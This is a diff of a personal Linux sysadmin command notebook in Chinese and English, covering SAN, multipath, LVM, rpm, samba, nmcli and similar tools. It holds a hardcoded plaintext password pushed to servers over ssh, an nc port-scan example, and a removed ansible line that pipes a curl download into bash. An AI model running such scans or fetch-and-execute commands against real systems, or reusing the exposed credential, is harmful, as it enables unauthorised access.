@@ -1,331 +1,187 @@
-##### 文件系统使用率大于40% ######
-[root@repo-centos ~]# while read num t;do [ ${num%%%} -gt 40 ] && echo $num $t;done< <(df --output=pcent,target |tail -n +2)
-48% /mrepo
+=========================================================== 命 令 ===========================================================
 
+###########################user administration####################
+gpasswd -d user1 group1      delete user1 from group1 (redhat)
+groupmod -R user1 group1    (SUSE)
+groupmod -A user1 group1    (SUSE)
 
-$ curl -k -x http://10.67.124.210:808 https://raw.githubusercontent.com/fabric8io/docker-dirsrv-389ds/master/Dockerfile -o /c/Users/chensen/Dockerfile
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
-                                 Dload  Upload   Total   Spent    Left  Speed
-100  1260  100  1260    0     0    450      0  0:00:02  0:00:02 --:--:--   450
+################### change password ###################
+[chensen@cfibml08 commands]$ cat chpass
+echo chensen:`openssl passwd -1 mc336@FB` > chpass.txt;sudo /usr/sbin/chpasswd -e <chpass.txt          ### encrypted password on server
+[chensen@cfibml08 commands]$for srv in `cat mci_srvlist_valid`;do ssh -t $srv $(<chpass);done
+[chensen@cfibml08 commands]$ for srv in `cat mci_srvlist_valid`;do ssh -t $srv "sudo chage -l chensen|grep Last";done
 
-######## dns记录 ##########
-C:\Users\chensen>nslookup -q=txt hp.com
-C:\Users\chensen>nslookup -q=SRV _ldap._tcp.cesbg.foxconn
+echo chensen:`openssl passwd -1 mc336@FB` |chpasswd -e                  ###encrypt
+echo "chensen:mc336@FB" |chpasswd          ###don't need encrypt
 
-######### 作为 reposync centos8更新不到新包时的workaround ########
-on repo8 container:
-dnf module install idm:DL1/{server,client,dns,adtrust} --downloadonly
-mv -f /var/cache/dnf/AppStream-bf1daca1ea021975/packages/*.rpm /usr/share/nginx/html/centos8-x86_64/AppStream/Packages
-dnf clean packages
+######### SAN ####################
+[root@pcarshn01 ~]# lspci|grep -i fibre
+18:00.0 Fibre Channel: QLogic Corp. ISP2432-based 4Gb Fibre Channel to PCI Express HBA (rev 03)
+1e:00.0 Fibre Channel: QLogic Corp. ISP2432-based 4Gb Fibre Channel to PCI Express HBA (rev 03)
+[root@pcarshn01 ~]# ls /sys/class/fc_host/
+host3  host4
+[root@pcarshn01 ~]# ls /sys/class/fc_remote_ports
+rport-3:0-0  rport-4:0-0
+[root@pcarshn01 ~]# ls /sys/class/fc_transport/
+target3:0:0  target4:0:0
+# systool -c fc_host -v
+# systool -c fc_transport -v
+# systool -c fc_remote_ports -v
+# ls -l /sys/block/*/device
+# pvs
+-------------------scan HBA-------------------------
+for i in `ls /sys/class/fc_host/`
+do
+echo "***************************************************************"
+echo "Scanning HBA on `uname -n`"
+echo "1" > /sys/class/fc_host/$i/issue_lip
+echo "- -- - -" > /sys/class/scsi_host/$i/scan
+echo "***************************************************************"
+done
 
-########### e1000 driver not supported in RHEL 8######
-11.1.3.3. The e1000 network driver is not supported in RHEL 8
-In Red Hat Enterprise Linux 8, the e1000 network driver is not supported. This affects both bare metal and virtual environments. However, 
-the newer e1000e network driver continues to be fully supported in RHEL 8.
+############ multipathd ###############################
+# echo "help" | multipathd -k
+# echo "show maps" | multipathd -k
+#multipathd -k"show maps"      no space after -k
+psh login "multipathd -k\"show maps\""
 
-######## lsof ##########
-[root@repo-centos ~]# [root@repo-centos ~]# lsof -P -i TCP
-COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
-sshd       1184 root    3u  IPv4   24526      0t0  TCP *:22 (LISTEN)
-sshd       1184 root    4u  IPv6   24528      0t0  TCP *:22 (LISTEN)
-master     1399 root   13u  IPv4   26178      0t0  TCP localhost:25 (LISTEN)
-master     1399 root   14u  IPv6   26179      0t0  TCP localhost:25 (LISTEN)
-sshd       2156 root    3u  IPv4   37081      0t0  TCP repo-centos:22->tjcesit-048.cesbg.foxconn:61699 (ESTABLISHED)
-docker-pr  2330 root    4u  IPv6   45579      0t0  TCP *:8084 (LISTEN)
-docker-pr  2455 root    4u  IPv6   36853      0t0  TCP *:80 (LISTEN)
-docker-pr  2546 root    4u  IPv6   47213      0t0  TCP *:8083 (LISTEN)
-docker-pr  3441 root    4u  IPv6   88901      0t0  TCP *:8082 (LISTEN)
-docker-pr  3774 root    4u  IPv6   91973      0t0  TCP *:8081 (LISTEN)
-docker-pr  3923 root    4u  IPv6   93367      0t0  TCP *:8080 (LISTEN)
-sshd       8437 root    3u  IPv4 1332763      0t0  TCP repo-centos:22->10.67.125.23:55836 (ESTABLISHED)
-sshd       9147 root    3u  IPv4 1344074      0t0  TCP repo-centos:22->10.67.125.23:56885 (ESTABLISHED)
-docker-pr  9287 root    4u  IPv6 1346711      0t0  TCP *:9000 (LISTEN)
-docker-pr  9301 root    4u  IPv6 1346725      0t0  TCP *:8000 (LISTEN)
-ssh       16906 root    3u  IPv4 1496867      0t0  TCP repo-centos:38706->10.67.51.158:22 (ESTABLISHED)
-sshd      22535 root    3u  IPv4 1051988      0t0  TCP repo-centos:22->tjcesit-048.cesbg.foxconn:49293 (ESTABLISHED)
-connect-p 22604 root    3u  IPv4 1058133      0t0  TCP repo-centos:56344->10.67.36.66:1080 (ESTABLISHED)
-[root@repo-centos ~]# ss -antl
-State      Recv-Q Send-Q                            Local Address:Port                                           Peer Address:Port
-LISTEN     0      100                                   127.0.0.1:25                                                        *:*
-LISTEN     0      128                                           *:22                                                        *:*
-LISTEN     0      100                                         ::1:25                                                       :::*
-LISTEN     0      128                                          :::8000                                                     :::*
-LISTEN     0      128                                          :::9000                                                     :::*
-LISTEN     0      128                                          :::8080                                                     :::*
-LISTEN     0      128                                          :::80                                                       :::*
-LISTEN     0      128                                          :::8081                                                     :::*
-LISTEN     0      128                                          :::8082                                                     :::*
-LISTEN     0      128                                          :::8083                                                     :::*
-LISTEN     0      128                                          :::8084                                                     :::*
-LISTEN     0      128                                          :::22                                                       :::*
-############## ngrep 查看包的内容############
-[root@vstjzabdb03 ~]# ngrep -d ens192 -q -i -W byline 'select' port 3306
-interface: ens192 (10.67.50.0/255.255.254.0)
-filter: ( port 3306 ) and ((ip || ip6) || (vlan && (ip || ip6)))
-match: select
+multipath -ll
+udevadm info -q all -p /block/sda
+udevinfo -q all -p /block/sdx
 
-T 10.67.49.247:42040 -> 10.67.51.118:3306 [AP] #1
-.....select h.hostid,h.host,h.name,t.httptestid,t.name,t.agent,t.authentication,t.http_user,t.http_password,t.http_proxy,t.retries,t.ssl_cert_file,t.ssl_key_file,t.ssl_key_password,t.verify_peer,t.verify_host,t.delay from httptest t,hosts h where t.hostid=h.hostid and t.nextcheck<=1574237897 and mod(t.httptestid,100)=94 and t.status=0 and h.proxy_hostid is null and h.status=0 and (h.maintenance_status=0 or h.maintenance_type=0)
+#############  udevadm ################################
+udevadm info -q path -n /dev/sda
+udevadm info -q all -p /devices/pci0000:00/0000:00:1f.2/host0/target0:0:0/0:0:0:0/block/sda
+udevadm info -q all -p /block/sda
+udevinfo -q all -p /block/sdx
+udevadm info -q all -n /dev/sda
 
-T 10.67.49.247:42814 -> 10.67.51.118:3306 [AP] #4
-.....select min(t.nextcheck) from httptest t,hosts h where t.hostid=h.hostid and mod(t.httptestid,100)=2 and t.status=0 and h.proxy_hostid is null and h.status=0 and (h.maintenance_status=0 or h.maintenance_type=0)
+udevadm info -a -p /block/sda
+udevadm info -a -n /dev/sda
+udevadm info -a -p /sys/class/net/eth0
 
+################ iconv ############
+iconv -f UTF-16LE -t UTF-8 -o Cirats_records ALL\ Records\ -\ Department\ Specific.csv
 
-############ default update/scrape interval of monitoring softwares ###########
-prometheus  15s
-global:
-  scrape_interval:     15s # Set the scrape interval to every 15 seconds. Default is every 1 minute.
-zabbix    
-建item时间指定或template中指定, 默认 30s 或 1m  
+##############################GPFS check################################3
+# mmlscluster
+# mmlsmgr
+# mmlsconfig
+# mmlsnsd -L
+# mmlsnsd -X
+# mmlsdisk rsidev -L
+# mmlsdisk rsidev -eL
+# mmdf rsidev
+# mmlsfs rsidev
+# psh login ifconfig bond0:0
+# crm_mon -1
 
-#############crontab 每5秒执行一次脚本######
-## For excuting scripts.sh every 3 seconds##on 2014-10-15
-*/1 * * * *  /home/somedir/scripts.sh
-*/1 * * * * sleep 5 &&  /home/somedir/scripts.sh
-*/1 * * * * sleep 10 &&  /home/somedir/scripts.sh
-*/1 * * * * sleep 15 &&  /home/somedir/scripts.sh
-*/1 * * * * sleep 20 &&  /home/somedir/scripts.sh
-*/1 * * * * sleep 25 &&  /home/somedir/scripts.sh
-........
+#############################rpm & yum ####################################
+[sam@oc1181188062 ~]$ rpm -q --queryformat %-{name}-%{version}-%{release}.%{arch}"\n" openssl
+openssl-1.0.1e-16.el6_5.7.x86_64
+openssl-1.0.1e-16.el6_5.7.i686
 
-########page in/out#########
-非hypervosor时, page out 和 write相近, page in 和read相近
-centos-repo server
-# dstat -ar
-----total-cpu-usage---- -dsk/total- -net/total- ---paging-- ---system-- --io/total-
-usr sys idl wai hiq siq| read  writ| recv  send|  in   out | int   csw | read  writ
-  2   4  94   0   0   0| 356k    0 |3040B 1086B|   0     0 | 525   384 |18.0     0
-  3  12  85   0   0   0|  12M    0 |2620B  580B|   0     0 |2455  3472 | 790     0
-  4  15  81   0   0   0|  12M   61k|2426B  580B|   0     0 |2544  3444 | 765  2.00
- 11  15  75   0   0   0|   0     0 |2778B  596B|   0     0 |1663   987 |   0     0
- 10  15  75   0   0   0|   0     0 |3030B  678B|   0     0 |1926  1090 |   0     0
-  5  14  80   0   0   0|1060k    0 |2556B 1292B|   0     0 |3375  1885 |73.0     0
-  3   8  89   0   0   0|4332k    0 |2386B 1140B|   0     0 |2227  1977 | 315     0
-  3   8  89   0   0   0|2616k 2400k|2516B  678B|   0     0 |1997  1632 | 180  75.0
-  2   8  89   0   0   0|3540k    0 |2358B  596B|   0     0 |1943  1842 | 234     0
-  4  11  85   0   0   0|3264k    0 |1934B  580B|   0     0 |1998  1938 | 222     0
-  2  12  86   0   0   0|6468k    0 |2756B  580B|   0     0 |3054  2687 | 423     0
-  4  13  82   0   0   0|4544k 2432k|2584B  580B|   0     0 |2892  2539 | 302  76.0
-  5  13  82   0   0   0|5492k    0 |2488B  824B|   0     0 |2803  2036 | 344     0
+###How to download only the rpm package without install####
+yum install yum-downloadonly
+yum upgrade --downloadonly --downloaddir=/home/chensen/packages kernel kernel-headers openssl openssl-devel nc parted
+yum install --downloadonly --downloaddir=/home/chensen/packages nc parted
+yum upgrade --downloadonly --downloaddir=/home/chensen/packages kernel nss nspr samba3x-client samba3x-common samba3x-winbind
 
-# sar -B 1  
-05:14:13 PM  pgpgin/s pgpgout/s   fault/s  majflt/s  pgfree/s pgscank/s pgscand/s pgsteal/s    %vmeff
-05:14:14 PM    292.00      0.00    588.00      1.00     98.00      0.00      0.00      0.00      0.00
-05:14:15 PM  12200.00      0.00   1786.00      0.00     70.00      0.00      0.00      0.00      0.00
-05:14:16 PM  11924.00     60.00   2270.00      0.00    366.00      0.00      0.00      0.00      0.00
-05:14:17 PM     64.00      0.00   2671.00      0.00   1173.00      0.00      0.00      0.00      0.00
-05:14:18 PM      0.00      0.00   2080.00      0.00   1211.00      0.00      0.00      0.00      0.00
-05:14:19 PM    696.00      0.00    260.00      0.00  42368.00  20371.00      0.00  20371.00    100.00
-05:14:20 PM   4448.00      0.00     18.00      0.00     39.00      0.00      0.00      0.00      0.00
-05:14:21 PM   2260.00   2400.00    309.00      0.00   5868.00   5642.00      0.00   5642.00    100.00
-05:14:22 PM   3584.00      0.00    439.00      0.00  10301.00  10188.00      0.00  10188.00    100.00
-05:14:23 PM   3788.00      0.00    606.00      0.00  12193.00  11866.00      0.00  11866.00    100.00
-05:14:24 PM   6504.00      0.00   1067.00      0.00  15926.00  15604.00      0.00  15604.00    100.00
-05:14:25 PM   3616.00   2432.00    807.00      0.00  35042.00  12450.00      0.00  12450.00    100.00
-05:14:26 PM   6404.00      0.00    550.00      0.00  11649.00  11450.00      0.00  11450.00    100.00
+###How to check the files contained in rpm package and extract file from rpm package#######
+rpm2cpio mysql-server/application
 
+find peoplever.rpm | cpio -t
+rpm2cpio mysql-server.rpm | cpio -ivd "file name"
 
+######### mysql命令 ########
+for i in `cat igalist`;do echo -n $i;fc $i|grep 'Application:';done
+mysql SrvInformation -e "select SrvName,Application from SrvInfo"
+mysql facts -E <<< "select * from sir where SERVER_NAME= and account_name='IBMALinux'"
+mysql facts -e "select * from sir where SERVER_NAME= and account_name='IBMALinux'\G"
 
+#######transfer time from one format to another format###########
+[sam@oc1181188062 test]$ ssh chensen@vader "date +%s;date"
+1412036236
+Tue Sep 30 10:17:16 EST 2014
+[sam@oc1181188062 test]$ date -d@1412036236 +"%F %T"
+2014-09-30 08:17:16
+[sam@oc1181188062 test]$ date -d@1412036236 
+Tue Sep 30 08:17:16 CST 2014
 
-###########tcpdump############
-root@node-1:~# tcpdump -i bond0 -nn -e vlan
+###########IBM ServeRAID tools###########
+./ipssend getconfig 1
+./ipssend getstatus 1
 
-#########Centos7 lvm cache########
-# pvcreate /dev/sdb
-# vgextend centos /dev/sdb
-[root@lvmcache ~]# lvcreate --type cache-pool -l 100%FREE -n cpool centos /dev/sdb
-  Logical volume "cpool" created.
-[root@lvmcache ~]# lvs
-  LV    VG     Attr       LSize   Pool Origin Data%  Meta%  Move Log Cpy%Sync Convert
-  cpool centos Cwi---C--- <19.96g
-  root  centos -wi-ao----  37.25g
-  swap  centos -wi-ao----  <3.82g
-[root@lvmcache ~]# lvconvert --type cache --cachepool centos/cpool centos/root
-Do you want wipe existing metadata of cache pool centos/cpool? [y/n]: y
-  Logical volume centos/root is now cached.
-[root@lvmcache ~]# lvs
-  LV   VG     Attr       LSize  Pool    Origin       Data%  Meta%  Move Log Cpy%Sync Convert
-  root centos Cwi-aoC--- 37.25g [cpool] [root_corig] 0.00   13.01           0.00
-  swap centos -wi-ao---- <3.82g
-[root@lvmcache ~]# lsblk
-NAME                  MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
-fd0                     2:0    1    4K  0 disk
-sda                     8:0    0   50G  0 disk
-├─sda1                  8:1    0  476M  0 part /boot
-└─sda2                  8:2    0 41.1G  0 part
-  ├─centos-swap       253:1    0  3.8G  0 lvm  [SWAP]
-  └─centos-root_corig 253:4    0 37.3G  0 lvm
-    └─centos-root     253:0    0 37.3G  0 lvm  /
-sdb                     8:16   0   20G  0 disk
-├─centos-cpool_cdata  253:2    0   20G  0 lvm
-│ └─centos-root       253:0    0 37.3G  0 lvm  /
-└─centos-cpool_cmeta  253:3    0   20M  0 lvm
-  └─centos-root       253:0    0 37.3G  0 lvm  /
-[root@lvmcache ~]# lvs -a -o name,vg_name,size,pool_lv,devices,cachemode,chunksize
-  LV              VG     LSize   Pool    Devices         CacheMode    Chunk
-  [cpool]         centos <19.96g         cpool_cdata(0)  writethrough 64.00k
-  [cpool_cdata]   centos <19.96g         /dev/sdb(10)                     0
-  [cpool_cmeta]   centos  20.00m         /dev/sdb(5)                      0
-  [lvol0_pmspare] centos  20.00m         /dev/sdb(0)                      0
-  root            centos  37.25g [cpool] root_corig(0)   writethrough 64.00k
-  [root_corig]    centos  37.25g         /dev/sda2(0)                     0
-  swap            centos  <3.82g         /dev/sda2(9537)                  0
-[root@lvmcache ~]# lvs -a -o devices,cachetotalblocks,cacheusedblocks,cachereadhits,cachereadmisses
-  Devices         CacheTotalBlocks CacheUsedBlocks  CacheReadHits    CacheReadMisses
-  cpool_cdata(0)            326976               17               18              126
-  /dev/sdb(10)
-  /dev/sdb(5)
-  /dev/sdb(0)
-  root_corig(0)             326976               17               18              126
-  /dev/sda2(0)
-  /dev/sda2(9537)
-# detaching a cache pool
-# lvconvert --splicache centos/cpool
+###############smbldap#############
+pdbedit -Lv alewhite  Account Flags:        [UX          ]   X表示ID被锁
+pdbedit -z -c [] username     samba ID 解锁
 
-####### CentOS7 tuned##########
-profile里有一些cpu,disk,sysctl的调优参数
-tuned-adm active          #查看现在使用的profile
-tuned-adm profile throughput-performance         #切换到某profile
+######vim########
+:%s/p1/p2/g
+:g/pattern/d
+:g/pattern/p
 
-DB类禁用透明大页
-[root@stjes1 ~]# vi /usr/lib/tuned/throughput-performance/tuned.conf
-add following lines:
-[vm]
-transparent_hugepages=never
-[root@stjes1 ~]# cat /sys/kernel/mm/transparent_hugepage/enabled
-[always] madvise never
-[root@stjes1 ~]# tuned-adm profile throughput-performance
-[root@stjes1 ~]# cat /sys/kernel/mm/transparent_hugepage/enabled
-always madvise [never]
+###########################dsmc############
+dsmc rest "/opt/IBM/WebSphere/AppServer/logs/appLogs/RequestDeliveryCapabilityMED.log" "Nov20/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext01/httplogs/access_log*.gz" "ext01/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext02/httplogs/access_log*.gz" "ext02/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext02/httplogs/error_log*.gz" "ext02/" -ina -pick
+dsmc rest "/opt/IBM/HTTPServer/IHS/conf/ext01/httplogs/error_log*.gz" "ext01/" -ina -pick
+dsmc rest "/usr/*" /media/target/usr -sub=yes 
+dsmc q backup "/etc/openldap/slapd.conf"
+dsmc rest -pitd=04/16/2015 -pitt=15:08:51 "/etc/openldap/slapd.conf" /home/chensen/slapd.conf
+scp -r au04qws001djsr2 chensen@cn.ibm.com@w3-transfer.boulder.ibm.com:/w3/ibmconf/CSIRT_AU/2957
 
-############ if判断 #################
-root@rabbit1:~# if [[ -n $(rabbitmqctl cluster_status | grep rabbit1) ]];then echo living;fi                  -n string长度非零返回真, 非空为真
-living
-root@rabbit1:~# if [[ ! -z $(rabbitmqctl cluster_status | grep rabbit1) ]];then echo living;fi                -z string长度为零返回真, 空为真
-living
+######################################
+一个经典的用法是端口扫描。比如我要扫描192.168.56.2主机1~100端口
+nc -zv 192.168.56.2 1-100 |& grep 'succeeded!'
 
-############ firewall-cmd ############
-启用masquerade
-[root@kvm-prod ~]# firewall-cmd --zone=public --add-masquerade --permanent
-success
-[root@kvm-prod ~]# firewall-cmd --reload
-success
-You have mail in /var/spool/mail/root
-[root@kvm-prod ~]# firewall-cmd --zone=public --query-masquerade
-yes
-开启端口5930-5933
-[root@KVMSERVER ~]# firewall-cmd --zone=public --add-port=5930-5933/tcp --permanent
-success
-[root@KVMSERVER ~]# firewall-cmd --reload
-success
+#############samba############
+smbclient -L //10.67.50.89 -U "cesbg\h7108579"
+smbclient --user="cesbg\h7108579" //10.67.50.89/OVA
+mount -t cifs -r -o username=cesbg/h7108579 //10.67.50.89/OVA /mnt/OVA
+mount -t cifs -r -o username=cesbg/h7108579 //10.67.50.93/IT /mnt/IT
 
-###########systemd-detect-virt############
-[root@kafka1 ~]# systemd-detect-virt
-none
-root@zabbix-openstack:~# systemd-detect-virt
-kvm
-root@rabbit2:/etc/rabbitmq# systemd-detect-virt
-lxc
-root@lxd-1804:~# systemd-detect-virt
-vmware
+###########ubuntu change default gateway#### temp
+ip route change default via 10.20.0.21 dev br-fw-admin
 
-#######Google搜索技巧##########
-1 指定文件类型
-ELK介绍 filetype:pdf
-2 指定网站
-ELK site:slideshare.net
+########## hpaculi用法 #####
+slotid=`hpacucli ctrl all show status | grep 'Smart Array'|awk '{ print $6 }'`
+hpacucli ctrl slot=$slotid pd all show status
+hpacucli ctrl slot=$slotid ld all show status
+hpacucli ctrl slot=$slotid show detail |grep 'Battery/Capacitor'
 
-##############ulimit#######
-There are two ways of changing the ulimit setting on a machine.
+############确认硬盘位置###########
+root@node-14:/dev/disk# lspci -v |grep -A1 RAID
+02:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS 2008 [Falcon] (rev 03)
+        Subsystem: Dell PERC H310 Mini Monolithics
+--
+04:00.0 RAID bus controller: LSI Logic / Symbios Logic MegaRAID SAS 2008 [Falcon] (rev 03)
+        Subsystem: Dell PERC H310 Adapter
+结合idrac查看是哪个raid卡。注意：idrac中物理硬盘的名称与lsscsi里位置对不上。
+root@node-14:/proc/scsi# dmesg|grep sdj|grep FAILED
+[7779092.592470] sd 7:0:2:0: [sdj] tag#0 FAILED Result: hostbyte=DID_OK driverbyte=DRIVER_SENSE
+root@node-14:/dev/disk# lsscsi
+root@node-14:/proc/scsi# cat /proc/scsi/scsi
 
-1 ulimit -n <some_value>. This will change the ulimit settings only for the current shell session. As soon as you open another shell session, you are back to square one i.e. 1024 file 
-descriptors. So this is probably not what you want.
+######### git 命令 #########
+git pull = git fetch + git merge
+git merge fast-forward
 
-2 fs.file-max = 500000. Add this line to the end of the file /etc/sysctl.conf. And add the following
-* soft nofile 500000
-* hard nofile 500000
-root soft nofile 500000
-root hard nofile 500000
-to the file /etc/security/limits.conf.
-The * basically represents that we are setting these values for all the users except root. “soft or hard” basically represent soft or hard limits. 
-The next entry specifies the item for which we want to change the limit values i.e. nofile in this case which means the number of open files . 
-And finally we have the value we wanna set which in this case is 500000. The * here does not apply to a root user, hence the last two lines specially for the root user.
+###########most expensive i/o process################
+dstat --aio --io --disk --tcp --top-io-adv --top-bio-adv
 
-After doing this, you need to take a reboot of the system. Sadly yes :( And the changes should reflect in the ulimit -n command.
+###########restore LV using LVM Snapshot########
+0 Create LVM Snapshot of the Logical Volume
+[root@tuxfixer ~]# lvcreate -s -n storage_snapshot -L 10G /dev/fedora/storage
+  Logical volume "storage_snapshot" created.
+1 umount lv from mount point
+2 restore storage Volume content by means of merging storage_snapshot with that Volume
+[root@tuxfixer ~]# lvconvert --merge /dev/fedora/storage_snapshot
+  Merging of volume storage_snapshot started.
+  storage: Merged: 100.0%
 
-########## facter盘点OS #########
-[root@kafka3 ~]# facter hostname virtual productname processor0 memorysize ipaddress lsbdistdescription processorcount operatingsystemrelease
-hostname => kafka3
-ipaddress => 10.67.51.146
-lsbdistdescription => nil
-memorysize => 62.73 GB
-operatingsystemrelease => 7.5.1804
-processor0 => Intel(R) Xeon(R) CPU E5-2650 v2 @ 2.60GHz
-processorcount => 32
-productname => R2-1206R-PA
-virtual => physical
-
-[root@es1 ~]# facter hostname virtual productname processor0 memorysize ipaddress lsbdistdescription processorcount operatingsystemrelease
-hostname => es1
-ipaddress => 10.67.36.53
-lsbdistdescription => CentOS Linux release 7.5.1804 (Core)
-memorysize => 15.51 GB
-operatingsystemrelease => 7.5.1804
-processor0 => Intel(R) Xeon(R) CPU E5-2620 0 @ 2.00GHz
-processorcount => 4
-productname => VMware Virtual Platform
-virtual => vmware
-
-###########grub2#########
-/etc/default/grub  custom settings
-/etc/grub.d/     template files
-
-#grub2的配置文件 
-/boot/grub2/grub.cfg file on traditional BIOS-based machines
-/boot/efi/EFI/fedora/grub.cfg file on UEFI machines
-
-#menuentry
-linux  64-bit IBM POWER Series
-linux16 x86_64 BIOS-based systems
-linuxefi  UEFI-based systems
-
-#grubby命令
-[root@cobbler grub2]# grubby --default-kernel
-/boot/vmlinuz-3.10.0-514.21.2.el7.x86_64
-
-[root@cobbler grub2]# grubby --info=ALL
-index=0
-kernel=/boot/vmlinuz-3.10.0-514.21.2.el7.x86_64
-args="ro crashkernel=auto rd.lvm.lv=sysvg/root rhgb quiet LANG=en_US.UTF-8"
-root=/dev/mapper/sysvg-root
-initrd=/boot/initramfs-3.10.0-514.21.2.el7.x86_64.img
-title=CentOS Linux (3.10.0-514.21.2.el7.x86_64) 7 (Core)
-index=1
-kernel=/boot/vmlinuz-3.10.0-327.el7.x86_64
-args="ro crashkernel=auto rd.lvm.lv=sysvg/root rhgb quiet LANG=en_US.UTF-8"
-root=/dev/mapper/sysvg-root
-initrd=/boot/initramfs-3.10.0-327.el7.x86_64.img
-title=CentOS Linux (3.10.0-327.el7.x86_64) 7 (Core)
-index=2
-kernel=/boot/vmlinuz-0-rescue-2170484fa7764747863cc1df9de5ebbb
-args="ro crashkernel=auto rd.lvm.lv=sysvg/root rhgb quiet"
-root=/dev/mapper/sysvg-root
-initrd=/boot/initramfs-0-rescue-2170484fa7764747863cc1df9de5ebbb.img
-title=CentOS Linux (0-rescue-2170484fa7764747863cc1df9de5ebbb) 7 (Core)
-index=3
-non linux entry
-
-~]# grubby --remove-args="rhgb quiet" --args=console=ttyS0,115200 --update-kernel /boot/vmlinuz-4.2.0-1.fc23.x86_64
-##########定时任务 getpwnam() failed###########
-cron没有写root所致
-*/1 * * * * root /etc/zabbix/zabbix_agentd.d/pageinout.sh
-###########SFP Module#########
-[root@cobbler ~]# ansible openstack -m shell -a "ethtool -m eno1 |egrep 'Vendor name|Vendor PN'"
-10.21.0.5 | CHANGED | rc=0 >>
-        Vendor name                               : AOI
-        Vendor PN                                 : A7EL-SN85-ADMA
-
-############# nmcli ##############
+############# nmcli用法 ##############
 nmcli conn add con-name ens32 type ethernet ifname ens32 autoconnect yes ipv4.addr 10.67.36.220/22 ipv4.gateway 10.67.36.1 ipv4.dns 10.67.50.111
 nmcli conn mod ens160 ipv4.addr 10.67.51.164/23 ipv4.gateway 10.67.50.1 ipv4.dns 10.67.50.111 ipv4.method manual
 nmcli con mod ens32 +ipv4.addresses 10.67.36.221/22
@@ -347,345 +203,6 @@ IP6.GATEWAY:                            --
 [root@kafka2 ~]# nmcli conn modify team0 team.runner activebackup
 [root@kafka2 ~]# nmcli conn up team0
 Connection successfully activated (master waiting for slaves) (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/7)
-##########查找无效InRelease文件#########
-root@apt-repo:/root# find /var/spool/apt-mirror/mirror -name InRelease -ls
-2233786    8 -rw-rw-r--   1 apt-mirror apt-mirror     7093 Nov 12 19:25 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.4/ubuntu/dists/trusty/InRelease
-2233794    8 -rw-rw-r--   1 apt-mirror apt-mirror     7093 Nov 12 19:25 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.4/ubuntu/dists/xenial/InRelease
-2232621    8 -rw-rw-r--   1 apt-mirror apt-mirror     7093 Dec 27  2017 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.2/ubuntu/dists/trusty/InRelease
-2233140    8 -rw-rw-r--   1 apt-mirror apt-mirror     7089 Dec 27  2017 /var/spool/apt-mirror/mirror/repo.zabbix.com/zabbix/3.2/ubuntu/dists/xenial/InRelease
-7325699  108 -rw-rw-r--   1 apt-mirror apt-mirror   109198 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/xenial-security/InRelease
-2492116  240 -rw-rw-r--   1 apt-mirror apt-mirror   242048 Apr 27  2018 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/bionic/InRelease
-7325736  108 -rw-rw-r--   1 apt-mirror apt-mirror   109196 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/xenial-updates/InRelease
-2489075   68 -rw-rw-r--   1 apt-mirror apt-mirror    65861 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/trusty-security/InRelease
-2492092   88 -rw-rw-r--   1 apt-mirror apt-mirror    88722 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/bionic-updates/InRelease
-2489112   68 -rw-rw-r--   1 apt-mirror apt-mirror    65859 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/trusty-updates/InRelease
-7325773  244 -rw-rw-r--   1 apt-mirror apt-mirror   246846 Apr 22  2016 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/xenial/InRelease
-2492070   88 -rw-rw-r--   1 apt-mirror apt-mirror    88724 Apr 23 01:18 /var/spool/apt-mirror/mirror/mirrors.aliyun.com/ubuntu/dists/bionic-security/InRelease
-2234680   68 -rw-rw-r--   1 apt-mirror apt-mirror    66230 Apr 19 13:03 /var/spool/apt-mirror/mirror/mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/ubuntu/dists/
-                                                      * 此列是文件大小
-root@apt-repo:/root# find /var/spool/apt-mirror/mirror -name InRelease -a -size -100c -ls   查找小于100 bytes 的无效InRelease文件
-
-###########restore LV using LVM Snapshot########
-0 Create LVM Snapshot of the Logical Volume
-[root@tuxfixer ~]# lvcreate -s -n storage_snapshot -L 10G /dev/fedora/storage
-  Logical volume "storage_snapshot" created.
-1 umount lv from mount point
-2 restore storage Volume content by means of merging storage_snapshot with that Volume
-[root@tuxfixer ~]# lvconvert --merge /dev/fedora/storage_snapshot
-  Merging of volume storage_snapshot started.
-  storage: Merged: 100.0%
-
-############systemd 解决kafka connect启动太快而失败######
-Kafka Connect might start too fast and fail because Kafka service is not ready yet. By adding directive ExecStartPre = /usr/bin/sleep 10 to Kafka Connect service, 
-we can delay its start for 10 seconds. Or, which I like more, we would actually handle the failure and restart Kafka Connect.
-Restart = on-failure
-RestartSec = 10
-
-##########netstat recv-q send-q解释#######
-LISTEN状态
-Recv-Q：代表建立的连接还有多少没有被accept，比如Nginx接受新连接变的很慢
-Send-Q：代表listen backlog值
-
-ESTAB状态
-Recv-Q：内核中的数据还有多少(bytes)没有被应用程序读取，发生了一定程度的阻塞
-Send-Q：代表内核中发送队列里还有多少(bytes)数据没有收到ack，对端的接收处理能力不强
-
-######查询openstack kvm资源分配情况##############
-[root@cobbler ~]# ansible compute-prod -m shell -a "curl -s http://10.67.51.164/script/kvm_ops_usage.sh |bash"
-
-######kvm虚拟机使用四五个月以后，实体机swap占用高#####
-[root@kvm-prod images]# free -g
-              total        used        free      shared  buff/cache   available
-Mem:             62          31           0           2          30          27
-Swap:            31          28           3
-
-[root@kvm-prod images]# smem -rs swap |grep qemu
- 8995 qemu     /usr/libexec/qemu-kvm -name  7888380  3650768  3650922  3655344
